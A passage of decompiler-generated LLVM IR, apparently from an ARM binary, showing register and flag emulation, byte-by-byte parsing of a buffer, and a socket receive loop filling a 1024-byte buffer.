  %v4_9f48 = call i32 @function_13acc(i32 %v0_9f38, i32 %v0_9f3c, i32 ptrtoint (i32* @global_var_14388.97 to i32), i32 1)
  store i32 %v4_9f48, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9f4c = icmp slt i32 %v4_9f48, 0
  store i1 %v1_9f4c, i1* %cpsr_n.global-to-local, align 1
  %v2_9f4c = icmp eq i32 %v4_9f48, 0
  store i1 %v2_9f4c, i1* %cpsr_z.global-to-local, align 1
  %tmp225 = icmp slt i32 %v4_9f48, 1
  br i1 %tmp225, label %.dec_label_pc_9f6c_crit_edge, label %dec_label_pc_9f54

.dec_label_pc_9f6c_crit_edge:                     ; preds = %bb224
  %v1_9f74.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_9f6c

dec_label_pc_9f54:                                ; preds = %bb224
  %v0_9f54 = load i32, i32* @r6, align 4
  store i32 %v0_9f54, i32* %r0.global-to-local, align 4
  %v0_9f58 = load i32, i32* @r7, align 4
  store i32 %v0_9f58, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14388.97 to i32), i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_9f64 = call i32 @function_13acc(i32 %v0_9f54, i32 %v0_9f58, i32 ptrtoint (i32* @global_var_14388.97 to i32), i32 1)
  store i32 %v4_9f64, i32* %r0.global-to-local, align 4
  %v1_9f68 = add i32 %v4_9f64, -1
  store i32 %v1_9f68, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9f6c

dec_label_pc_9f6c:                                ; preds = %.dec_label_pc_9f6c_crit_edge, %dec_label_pc_9f54
  %v1_9f74 = phi i32 [ %v1_9f74.pre, %.dec_label_pc_9f6c_crit_edge ], [ %v1_9f68, %dec_label_pc_9f54 ]
  store i32 %v2_9a54, i32* %ip.global-to-local, align 4
  %v1_9f7c = add i32 %v2_9f74, %v1_9f74
  store i32 %v1_9f7c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v3_9f8c = load i32, i32* @sl, align 4
  %v4_9f8c = add i32 %v3_9f8c, %v1_9f7c
  %v5_9f8c = inttoptr i32 %v4_9f8c to i8*
  store i8 0, i8* %v5_9f8c, align 1
  %storemerge4.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_9fac.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_9fac

dec_label_pc_9f98:                                ; preds = %dec_label_pc_9fac
  br i1 %v7_9f9c, label %dec_label_pc_9fdc, label %dec_label_pc_9fa4

dec_label_pc_9fa4:                                ; preds = %dec_label_pc_9f98
  store i32 %v10_9048, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9fac

dec_label_pc_9fac:                                ; preds = %dec_label_pc_9f6c, %dec_label_pc_9fa4
  %v0_9fac = phi i32 [ %v0_9f98, %dec_label_pc_9fa4 ], [ %v0_9fac.pre, %dec_label_pc_9f6c ]
  %storemerge4 = phi i32 [ %v1_9fc0, %dec_label_pc_9fa4 ], [ %storemerge4.pre, %dec_label_pc_9f6c ]
  store i32 %v0_9fac, i32* %r0.global-to-local, align 4
  %v1_9fb0 = inttoptr i32 %v0_9fac to i8*
  %v2_9fb0 = call i32 @function_13a08(i8* %v1_9fb0)
  store i32 %v2_9fb0, i32* %r0.global-to-local, align 4
  store i32 %storemerge4, i32* %r4.global-to-local, align 4
  %v2_9fbc = sub i32 %v2_9fb0, %storemerge4
  %v3_9fbc = icmp uge i32 %v2_9fb0, %storemerge4
  store i1 %v3_9fbc, i1* %cpsr_c.global-to-local, align 1
  %v4_9fbc = xor i32 %v2_9fb0, %storemerge4
  %v5_9fbc = xor i32 %v2_9fbc, %v2_9fb0
  %v6_9fbc = and i32 %v5_9fbc, %v4_9fbc
  %v7_9fbc = icmp slt i32 %v6_9fbc, 0
  store i1 %v7_9fbc, i1* %cpsr_v.global-to-local, align 1
  %v8_9fbc = icmp slt i32 %v2_9fbc, 0
  store i1 %v8_9fbc, i1* %cpsr_n.global-to-local, align 1
  %v9_9fbc = icmp eq i32 %v2_9fb0, %storemerge4
  store i1 %v9_9fbc, i1* %cpsr_z.global-to-local, align 1
  %v1_9fc0 = add i32 %storemerge4, 1
  store i32 %v1_9fc0, i32* %ip.global-to-local, align 4
  %v8_9fc4 = icmp sgt i32 %v2_9fb0, %storemerge4
  %v0_9f98 = load i32, i32* @r5, align 4
  %v2_9f98 = add i32 %v0_9f98, %storemerge4
  %v3_9f98 = inttoptr i32 %v2_9f98 to i8*
  %v4_9f98 = load i8, i8* %v3_9f98, align 1
  %v6_9f98 = zext i8 %v4_9f98 to i32
  store i32 %v6_9f98, i32* %r3.global-to-local, align 4
  %v2_9f9c = icmp ugt i8 %v4_9f98, 60
  store i1 %v2_9f9c, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9f9c = icmp ult i8 %v4_9f98, 61
  store i1 %v6_9f9c, i1* %cpsr_n.global-to-local, align 1
  %v7_9f9c = icmp eq i8 %v4_9f98, 61
  store i1 %v7_9f9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_9fc4, label %dec_label_pc_9f98, label %dec_label_pc_9fc8

dec_label_pc_9fc8:                                ; preds = %dec_label_pc_9fac
  br i1 %v7_9f9c, label %dec_label_pc_9fdc, label %dec_label_pc_9fd4

dec_label_pc_9fd4:                                ; preds = %dec_label_pc_a020, %dec_label_pc_a044, %dec_label_pc_9fc8, %bb222
  %stack_var_-40.12 = phi i32 [ %stack_var_-40.11, %bb222 ], [ %stack_var_-40.14, %dec_label_pc_a044 ], [ %storemerge4, %dec_label_pc_9fc8 ], [ %v0_a020, %dec_label_pc_a020 ]
  %v0_9fd4 = load i32, i32* @sl, align 4
  store i32 %v0_9fd4, i32* @r5, align 4
  br label %dec_label_pc_9e80

dec_label_pc_9fdc:                                ; preds = %dec_label_pc_9f98, %dec_label_pc_9fc8
  %v0_9fdc = load i32, i32* @r8, align 4
  %v1_9fdc = add i32 %v0_9fdc, 12
  %v2_9fdc = inttoptr i32 %v1_9fdc to i32*
  %v3_9fdc = load i32, i32* %v2_9fdc, align 4
  store i32 %v3_9fdc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9fe8 = icmp slt i32 %v3_9fdc, 0
  store i1 %v1_9fe8, i1* %cpsr_n.global-to-local, align 1
  %v2_9fe8 = icmp eq i32 %v3_9fdc, 0
  store i1 %v2_9fe8, i1* %cpsr_z.global-to-local, align 1
  %tmp226 = icmp slt i32 %v3_9fdc, 1
  br i1 %tmp226, label %dec_label_pc_a044, label %dec_label_pc_9ff4

dec_label_pc_9ff4:                                ; preds = %dec_label_pc_9fdc
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_a020

dec_label_pc_9ffc:                                ; preds = %dec_label_pc_a020
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  store i32 %v0_a020, i32* %r3.global-to-local, align 4
  %v0_a004 = load i32, i32* @r8, align 4
  %v1_a004 = add i32 %v0_a004, 12
  %v2_a004 = inttoptr i32 %v1_a004 to i32*
  %v3_a004 = load i32, i32* %v2_a004, align 4
  %v1_a008 = add i32 %v0_a020, 1
  store i32 %v1_a008, i32* %ip.global-to-local, align 4
  %v2_a00c = sub i32 %v3_a004, %v1_a008
  %v3_a00c = icmp uge i32 %v3_a004, %v1_a008
  store i1 %v3_a00c, i1* %cpsr_c.global-to-local, align 1
  %v4_a00c = xor i32 %v3_a004, %v1_a008
  %v5_a00c = xor i32 %v2_a00c, %v3_a004
  %v6_a00c = and i32 %v5_a00c, %v4_a00c
  %v7_a00c = icmp slt i32 %v6_a00c, 0
  store i1 %v7_a00c, i1* %cpsr_v.global-to-local, align 1
  %v8_a00c = icmp slt i32 %v2_a00c, 0
  store i1 %v8_a00c, i1* %cpsr_n.global-to-local, align 1
  %v9_a00c = icmp eq i32 %v3_a004, %v1_a008
  store i1 %v9_a00c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  store i32 %v1_a008, i32* %r1.global-to-local, align 4
  %v7_a01c = icmp sgt i32 %v3_a004, %v1_a008
  %v0_a02c.pre = load i32, i32* @r5, align 4
  br i1 %v7_a01c, label %dec_label_pc_9ffc.dec_label_pc_a020_crit_edge, label %dec_label_pc_a044

dec_label_pc_9ffc.dec_label_pc_a020_crit_edge:    ; preds = %dec_label_pc_9ffc
  %v0_a030.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_a020

dec_label_pc_a020:                                ; preds = %dec_label_pc_9ffc.dec_label_pc_a020_crit_edge, %dec_label_pc_9ff4
  %v0_a030 = phi i32 [ %storemerge4, %dec_label_pc_9ff4 ], [ %v0_a030.pre, %dec_label_pc_9ffc.dec_label_pc_a020_crit_edge ]
  %v0_a02c = phi i32 [ %v0_9f98, %dec_label_pc_9ff4 ], [ %v0_a02c.pre, %dec_label_pc_9ffc.dec_label_pc_a020_crit_edge ]
  %v0_a020 = phi i32 [ 0, %dec_label_pc_9ff4 ], [ %v1_a008, %dec_label_pc_9ffc.dec_label_pc_a020_crit_edge ]
  %v1_a020 = and i32 %v0_a020, 33554432
  %v2_a020 = icmp ne i32 %v1_a020, 0
  store i1 %v2_a020, i1* %cpsr_c.global-to-local, align 1
  %v3_a020 = mul i32 %v0_a020, 128
  %v1_a024 = add i32 %v3_a020, 1472
  %v0_a028 = load i32, i32* %sb.global-to-local, align 4
  %v2_a028 = add i32 %v1_a024, %v0_a028
  store i32 %v2_a028, i32* %r1.global-to-local, align 4
  store i32 %v0_a02c, i32* %r0.global-to-local, align 4
  store i32 %v0_a030, i32* %r2.global-to-local, align 4
  %v3_a034 = inttoptr i32 %v0_a02c to i8*
  %v4_a034 = call i32 @function_13e6c(i8* %v3_a034, i32 %v2_a028, i32 %v0_a030)
  store i32 %v4_a034, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a038 = icmp slt i32 %v4_a034, 0
  store i1 %v1_a038, i1* %cpsr_n.global-to-local, align 1
  %v2_a038 = icmp eq i32 %v4_a034, 0
  store i1 %v2_a038, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a038, label %dec_label_pc_9ffc, label %dec_label_pc_9fd4

dec_label_pc_a044:                                ; preds = %dec_label_pc_9ffc, %dec_label_pc_9fdc
  %v0_a044 = phi i32 [ %v0_9f98, %dec_label_pc_9fdc ], [ %v0_a02c.pre, %dec_label_pc_9ffc ]
  %stack_var_-40.14 = phi i32 [ 0, %dec_label_pc_9fdc ], [ %v1_a008, %dec_label_pc_9ffc ]
  store i32 %v0_a044, i32* %r0.global-to-local, align 4
  %v1_a048 = inttoptr i32 %v0_a044 to i8*
  %v2_a048 = call i32 @function_13a08(i8* %v1_a048)
  store i32 %v2_a048, i32* %r0.global-to-local, align 4
  %v1_a04c = add i32 %v2_a048, -127
  %v2_a04c = icmp ugt i32 %v2_a048, 126
  store i1 %v2_a04c, i1* %cpsr_c.global-to-local, align 1
  %v3_a04c = sub i32 126, %v2_a048
  %v4_a04c = and i32 %v3_a04c, %v2_a048
  %v5_a04c = icmp slt i32 %v4_a04c, 0
  store i1 %v5_a04c, i1* %cpsr_v.global-to-local, align 1
  %v6_a04c = icmp slt i32 %v1_a04c, 0
  store i1 %v6_a04c, i1* %cpsr_n.global-to-local, align 1
  %v7_a04c = icmp eq i32 %v2_a048, 127
  store i1 %v7_a04c, i1* %cpsr_z.global-to-local, align 1
  %v8_a050 = icmp sgt i32 %v2_a048, 127
  br i1 %v8_a050, label %dec_label_pc_9fd4, label %dec_label_pc_a054

dec_label_pc_a054:                                ; preds = %dec_label_pc_a044
  %v0_a054 = load i32, i32* @r8, align 4
  %v1_a054 = add i32 %v0_a054, 12
  %v2_a054 = inttoptr i32 %v1_a054 to i32*
  %v3_a054 = load i32, i32* %v2_a054, align 4
  %v1_a058 = and i32 %v3_a054, 33554432
  %v2_a058 = icmp ne i32 %v1_a058, 0
  store i1 %v2_a058, i1* %cpsr_c.global-to-local, align 1
  %v3_a058 = mul i32 %v3_a054, 128
  %v1_a05c = add i32 %v3_a058, 1472
  %v0_a060 = load i32, i32* @r5, align 4
  store i32 %v0_a060, i32* %r1.global-to-local, align 4
  %v0_a064 = load i32, i32* %sb.global-to-local, align 4
  %v2_a064 = add i32 %v1_a05c, %v0_a064
  store i32 %v2_a064, i32* @r0, align 4
  %v2_a068 = inttoptr i32 %v2_a064 to i8*
  %v3_a068 = call i32 @function_13a30(i8* %v2_a068, i32 %v0_a060)
  store i32 %v3_a068, i32* %r0.global-to-local, align 4
  %v0_a06c = load i32, i32* @r8, align 4
  %v1_a06c = add i32 %v0_a06c, 12
  %v2_a06c = inttoptr i32 %v1_a06c to i32*
  %v3_a06c = load i32, i32* %v2_a06c, align 4
  %v0_a070 = load i32, i32* @sl, align 4
  store i32 %v0_a070, i32* @r5, align 4
  %v1_a074 = add i32 %v3_a06c, 1
  store i32 %v1_a074, i32* %r3.global-to-local, align 4
  store i32 %v1_a074, i32* %v2_a06c, align 4
  %v1_9e8c.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_9e80

dec_label_pc_a080:                                ; preds = %dec_label_pc_9eb4, %dec_label_pc_9e80
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 38, i32* %r0.global-to-local, align 4
  %v3_a088 = call i32 @function_13000(i32 38, i32* null)
  %v0_a08c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_a08c, i32* @r1, align 4
  store i32 %v3_a088, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_a098 = call i32 @function_13d5c(i8* %tmp197, i32 %v0_a08c, i32 %v3_a088)
  store i32 %v4_a098, i32* %r0.global-to-local, align 4
  %v1_a09c = add i32 %v4_a098, 1
  %v2_a09c = icmp eq i32 %v4_a098, -1
  store i1 %v2_a09c, i1* %cpsr_c.global-to-local, align 1
  %v3_a09c = sub i32 0, %v4_a098
  %v4_a09c = and i32 %v1_a09c, %v3_a09c
  %v5_a09c = icmp slt i32 %v4_a09c, 0
  store i1 %v5_a09c, i1* %cpsr_v.global-to-local, align 1
  %v6_a09c = icmp slt i32 %v1_a09c, 0
  store i1 %v6_a09c, i1* %cpsr_n.global-to-local, align 1
  %v7_a09c = icmp eq i32 %v1_a09c, 0
  store i1 %v7_a09c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a09c, label %dec_label_pc_a3d0, label %dec_label_pc_a0a4

dec_label_pc_a0a4:                                ; preds = %dec_label_pc_a080
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 38, i32* %r0.global-to-local, align 4
  %v3_a0ac = call i32 @function_13000(i32 38, i32* null)
  %v0_a0b0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_a0b0, i32* @r1, align 4
  store i32 %v3_a0ac, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_a0bc = call i32 @function_13d5c(i8* %tmp197, i32 %v0_a0b0, i32 %v3_a0ac)
  store i32 %v4_a0bc, i32* %r0.global-to-local, align 4
  store i32 %v2_9a54, i32* %ip.global-to-local, align 4
  %v2_a0c8 = add i32 %v4_a0bc, %v2_9a54
  store i32 %v2_a0c8, i32* %r3.global-to-local, align 4
  %v1_a0cc = load i32, i32* @r6, align 4
  %v2_a0cc = add i32 %v1_a0cc, %v2_a0c8
  %v3_a0cc = inttoptr i32 %v2_a0cc to i8*
  %v4_a0cc = load i8, i8* %v3_a0cc, align 1
  store i32 %v2_8fd8, i32* %lr.global-to-local, align 4
  %v2_a0d4 = icmp ugt i8 %v4_a0cc, 31
  store i1 %v2_a0d4, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a0d4 = icmp ult i8 %v4_a0cc, 32
  store i1 %v6_a0d4, i1* %cpsr_n.global-to-local, align 1
  %v7_a0d4 = icmp eq i8 %v4_a0cc, 32
  store i1 %v7_a0d4, i1* %cpsr_z.global-to-local, align 1
  %v2_a0dc = zext i1 %v7_a0d4 to i32
  %v2_a0dc.v4_a0bc = add i32 %v2_a0dc, %v4_a0bc
  store i32 %v2_a0dc.v4_a0bc, i32* @r4, align 4
  %v2_a0e0 = add i32 %v2_a0dc.v4_a0bc, %v2_8fd8
  store i32 %v2_a0e0, i32* @r5, align 4
  store i32 %v2_a0e0, i32* %r0.global-to-local, align 4
  %v1_a0e8 = load i32, i32* %fp.global-to-local, align 4
  %v2_a0e8 = sub i32 %v1_a0e8, %v2_a0dc.v4_a0bc
  store i32 %v2_a0e8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1435c.89 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_a0f4 = call i32 @function_13acc(i32 %v2_a0e0, i32 %v2_a0e8, i32 ptrtoint ([3 x i8]* @global_var_1435c.89 to i32), i32 2)
  store i32 %v5_a0f4, i32* %r0.global-to-local, align 4
  %v1_a0f8 = add i32 %v5_a0f4, 1
  %v2_a0f8 = icmp eq i32 %v5_a0f4, -1
  store i1 %v2_a0f8, i1* %cpsr_c.global-to-local, align 1
  %v3_a0f8 = sub i32 0, %v5_a0f4
  %v4_a0f8 = and i32 %v1_a0f8, %v3_a0f8
  %v5_a0f8 = icmp slt i32 %v4_a0f8, 0
  store i1 %v5_a0f8, i1* %cpsr_v.global-to-local, align 1
  %v6_a0f8 = icmp slt i32 %v1_a0f8, 0
  store i1 %v6_a0f8, i1* %cpsr_n.global-to-local, align 1
  %v7_a0f8 = icmp eq i32 %v1_a0f8, 0
  store i1 %v7_a0f8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_a0f4, i32* %lr.global-to-local, align 4
  br i1 %v7_a0f8, label %dec_label_pc_a3d0, label %dec_label_pc_a104

dec_label_pc_a104:                                ; preds = %dec_label_pc_a0a4
  store i32 %v2_9a54, i32* %r1.global-to-local, align 4
  %v1_a10c = add i32 %v5_a0f4, -1
  %v2_a10c = icmp ne i32 %v5_a0f4, 0
  store i1 %v2_a10c, i1* %cpsr_c.global-to-local, align 1
  %v3_a10c = sub i32 0, %v5_a0f4
  %v4_a10c = and i32 %v5_a0f4, %v3_a10c
  %v5_a10c = icmp slt i32 %v4_a10c, 0
  store i1 %v5_a10c, i1* %cpsr_v.global-to-local, align 1
  %v6_a10c = icmp slt i32 %v1_a10c, 0
  store i1 %v6_a10c, i1* %cpsr_n.global-to-local, align 1
  %v7_a10c = icmp eq i32 %v5_a0f4, 1
  store i1 %v7_a10c, i1* %cpsr_z.global-to-local, align 1
  %v1_a110 = load i32, i32* @r4, align 4
  %v2_a110 = add i32 %v1_a110, %v2_9a54
  store i32 %v2_a110, i32* %ip.global-to-local, align 4
  %v7_a114 = icmp sgt i32 %v5_a0f4, 1
  br i1 %v7_a114, label %bb227, label %bb228

bb227:                                            ; preds = %dec_label_pc_a104
  %v9_a114 = add i32 %v5_a0f4, -2
  store i32 %v9_a114, i32* %lr.global-to-local, align 4
  br label %bb228

bb228:                                            ; preds = %dec_label_pc_a104, %bb227
  %v3_a138 = phi i32 [ %v5_a0f4, %dec_label_pc_a104 ], [ %v9_a114, %bb227 ]
  %v1_a11c = add i32 %v3_a138, 1
  store i32 %v1_a11c, i32* %r6.global-to-local, align 4
  %v1_a120 = add i32 %v2_a110, -20773
  store i32 %v1_a120, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v0_a128 = load i32, i32* @r5, align 4
  store i32 %v0_a128, i32* %r0.global-to-local, align 4
  store i32 %v1_a11c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1438c.99 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v4_a138 = add i32 %v3_a138, %v1_a120
  %v5_a138 = inttoptr i32 %v4_a138 to i8*
  store i8 0, i8* %v5_a138, align 1
  %v5_a13c = call i32 @function_13acc(i32 %v0_a128, i32 %v1_a11c, i32 ptrtoint ([5 x i8]* @global_var_1438c.99 to i32), i32 4)
  store i32 %v5_a13c, i32* %r0.global-to-local, align 4
  %v1_a140 = add i32 %v5_a13c, -4
  %v2_a140 = icmp ugt i32 %v5_a13c, 3
  store i1 %v2_a140, i1* %cpsr_c.global-to-local, align 1
  %v3_a140 = sub i32 3, %v5_a13c
  %v4_a140 = and i32 %v3_a140, %v5_a13c
  %v5_a140 = icmp slt i32 %v4_a140, 0
  store i1 %v5_a140, i1* %cpsr_v.global-to-local, align 1
  %v6_a140 = icmp slt i32 %v1_a140, 0
  store i1 %v6_a140, i1* %cpsr_n.global-to-local, align 1
  %v7_a140 = icmp eq i32 %v5_a13c, 4
  store i1 %v7_a140, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a140, label %dec_label_pc_a6b8, label %dec_label_pc_a148

dec_label_pc_a148:                                ; preds = %bb228
  store i32 %v2_8fd8, i32* %ip.global-to-local, align 4
  %v1_a14c = load i32, i32* @r4, align 4
  %v2_a14c = add i32 %v1_a14c, %v2_8fd8
  %v3_a14c = inttoptr i32 %v2_a14c to i8*
  %v4_a14c = load i8, i8* %v3_a14c, align 1
  %v6_a14c = zext i8 %v4_a14c to i32
  store i32 %v6_a14c, i32* %r3.global-to-local, align 4
  %v2_a150 = icmp ugt i8 %v4_a14c, 46
  store i1 %v2_a150, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a150 = icmp ult i8 %v4_a14c, 47
  store i1 %v6_a150, i1* %cpsr_n.global-to-local, align 1
  %v7_a150 = icmp eq i8 %v4_a14c, 47
  store i1 %v7_a150, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a150, label %dec_label_pc_a8ac, label %dec_label_pc_a158

dec_label_pc_a158:                                ; preds = %dec_label_pc_a204, %dec_label_pc_a7f0, %dec_label_pc_a8dc, %dec_label_pc_a8ac, %dec_label_pc_a788, %dec_label_pc_a76c, %dec_label_pc_a148, %dec_label_pc_a8f8, %dec_label_pc_a7b8
  %stack_var_-40.15 = phi i32 [ %stack_var_-40.23, %dec_label_pc_a76c ], [ %stack_var_-40.23, %dec_label_pc_a788 ], [ %stack_var_-40.23, %dec_label_pc_a7b8 ], [ %stack_var_-40.11, %dec_label_pc_a8ac ], [ %stack_var_-40.11, %dec_label_pc_a8dc ], [ %stack_var_-40.11, %dec_label_pc_a8f8 ], [ %stack_var_-40.11, %dec_label_pc_a148 ], [ %stack_var_-40.7, %dec_label_pc_a7f0 ], [ %stack_var_-40.7, %dec_label_pc_a204 ]
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_a15c = load i32, i32* @r8, align 4
  %v3_a15c = add i32 %v2_a15c, -1452
  %v4_a15c = inttoptr i32 %v3_a15c to i8*
  store i8 1, i8* %v4_a15c, align 1
  br label %dec_label_pc_9590

dec_label_pc_a164:                                ; preds = %dec_label_pc_9580
  %v0_a164 = call i32* @__errno_location()
  %v1_a164 = ptrtoint i32* %v0_a164 to i32
  store i32 %v1_a164, i32* %r0.global-to-local, align 4
  %v0_a168 = load i32, i32* %sb.global-to-local, align 4
  %v1_a168 = add i32 %v0_a168, 1472
  store i32 %v1_a168, i32* %r3.global-to-local, align 4
  %v0_a170 = load i32, i32* @r8, align 4
  %v1_a170 = add i32 %v0_a170, 656
  %v2_a170 = inttoptr i32 %v1_a170 to i32*
  %v3_a170 = load i32, i32* %v2_a170, align 4
  store i32 %v3_a170, i32* %r3.global-to-local, align 4
  %v1_a178 = add i32 %v3_a170, -1024
  %v2_a178 = icmp ugt i32 %v3_a170, 1023
  store i1 %v2_a178, i1* %cpsr_c.global-to-local, align 1
  %v3_a178 = sub i32 1023, %v3_a170
  %v4_a178 = and i32 %v3_a178, %v3_a170
  %v5_a178 = icmp slt i32 %v4_a178, 0
  store i1 %v5_a178, i1* %cpsr_v.global-to-local, align 1
  %v6_a178 = icmp slt i32 %v1_a178, 0
  store i1 %v6_a178, i1* %cpsr_n.global-to-local, align 1
  %v7_a178 = icmp eq i32 %v3_a170, 1024
  store i1 %v7_a178, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a164, i32* %fp.global-to-local, align 4
  %v1_a180 = add i32 %v0_a168, 2116
  store i32 %v1_a180, i32* @r7, align 4
  br i1 %v7_a178, label %dec_label_pc_a280, label %dec_label_pc_a188

dec_label_pc_a188:                                ; preds = %dec_label_pc_a164, %dec_label_pc_a280, %dec_label_pc_a274
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_a18c = load i32, i32* %fp.global-to-local, align 4
  %v2_a18c = inttoptr i32 %v1_a18c to i32*
  store i32 0, i32* %v2_a18c, align 4
  %v0_a190 = load i32, i32* @r8, align 4
  %v1_a190 = add i32 %v0_a190, 656
  %v2_a190 = inttoptr i32 %v1_a190 to i32*
  %v3_a190 = load i32, i32* %v2_a190, align 4
  store i32 %v3_a190, i32* %r1.global-to-local, align 4
  %v1_a194 = add i32 %v0_a190, -1456
  %v2_a194 = inttoptr i32 %v1_a194 to i32*
  %v3_a194 = load i32, i32* %v2_a194, align 4
  store i32 %v3_a194, i32* %r0.global-to-local, align 4
  %v1_a198 = sub i32 1024, %v3_a190
  store i32 %v1_a198, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_a1a0 = load i32, i32* @r7, align 4
  %v2_a1a0 = add i32 %v0_a1a0, %v3_a190
  store i32 %v2_a1a0, i32* %r1.global-to-local, align 4
  %v4_a1a4 = call i32 @_recv(i32 %v3_a194, i32 %v2_a1a0, i32 %v1_a198, i32 16384)
  store i32 %v4_a1a4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a1a8 = icmp slt i32 %v4_a1a4, 0
  store i1 %v1_a1a8, i1* %cpsr_n.global-to-local, align 1
  %v2_a1a8 = icmp eq i32 %v4_a1a4, 0
  store i1 %v2_a1a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a1a8, label %dec_label_pc_a684, label %dec_label_pc_a1b0

dec_label_pc_a1b0:                                ; preds = %dec_label_pc_a188
  %v1_a1b0 = add i32 %v4_a1a4, 1
  %v2_a1b0 = icmp eq i32 %v4_a1a4, -1
  store i1 %v2_a1b0, i1* %cpsr_c.global-to-local, align 1
  %v3_a1b0 = sub i32 0, %v4_a1a4
  %v4_a1b0 = and i32 %v1_a1b0, %v3_a1b0
  %v5_a1b0 = icmp slt i32 %v4_a1b0, 0
  store i1 %v5_a1b0, i1* %cpsr_v.global-to-local, align 1
  %v6_a1b0 = icmp slt i32 %v1_a1b0, 0
  store i1 %v6_a1b0, i1* %cpsr_n.global-to-local, align 1
  %v7_a1b0 = icmp eq i32 %v1_a1b0, 0
  store i1 %v7_a1b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a1b0, label %dec_label_pc_a6a8, label %dec_label_pc_a1b8

dec_label_pc_a1b8:                                ; preds = %dec_label_pc_a1b0
  %v0_a1b8 = load i32, i32* @r8, align 4
  %v1_a1b8 = add i32 %v0_a1b8, 656
  %v2_a1b8 = inttoptr i32 %v1_a1b8 to i32*
  %v3_a1b8 = load i32, i32* %v2_a1b8, align 4
  store i32 %v2_9530, i32* %r1.global-to-local, align 4
  %v2_a1c0 = add i32 %v3_a1b8, %v4_a1a4
  store i32 %v2_a1c0, i32* @r4, align 4
  store i32 %v2_a1c0, i32* %v2_a1b8, align 4
  %v0_a1c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_a1c8 = load i32, i32* @r8, align 4
  %v2_a1c8 = add i32 %v1_a1c8, -1448
  %v3_a1c8 = inttoptr i32 %v2_a1c8 to i32*
  store i32 %v0_a1c8, i32* %v3_a1c8, align 4
  br label %dec_label_pc_a254

dec_label_pc_a1d0:                                ; preds = %dec_label_pc_a254
  %v1_a1d0 = add i32 %v0_a254, -4
  %v2_a1d0 = inttoptr i32 %v1_a1d0 to i32*
  %v3_a1d0 = load i32, i32* %v2_a1d0, align 4
  store i32 %v3_a1d0, i32* @sl, align 4
  %v1_a1d4 = load i32, i32* @r4, align 4
  %v5_a1d8 = icmp slt i32 %v3_a254, %v1_a1d4
  %storemerge = select i1 %v5_a1d8, i32 %v3_a254, i32 %v1_a1d4
  store i32 %storemerge, i32* @r5, align 4
  %v2_a1e0 = sub i32 %v3_a254, %storemerge
  store i32 %v2_a1e0, i32* @r6, align 4
  %v1_a1e4 = add i32 %v3_a1d0, -1
  %v2_a1e4 = icmp ne i32 %v3_a1d0, 0
  store i1 %v2_a1e4, i1* %cpsr_c.global-to-local, align 1
  %v3_a1e4 = sub i32 0, %v3_a1d0
  %v4_a1e4 = and i32 %v3_a1d0, %v3_a1e4
  %v5_a1e4 = icmp slt i32 %v4_a1e4, 0
  store i1 %v5_a1e4, i1* %cpsr_v.global-to-local, align 1
  %v6_a1e4 = icmp slt i32 %v1_a1e4, 0
  store i1 %v6_a1e4, i1* %cpsr_n.global-to-local, align 1
  %v7_a1e4 = icmp eq i32 %v3_a1d0, 1
  store i1 %v7_a1e4, i1* %cpsr_z.global-to-local, align 1
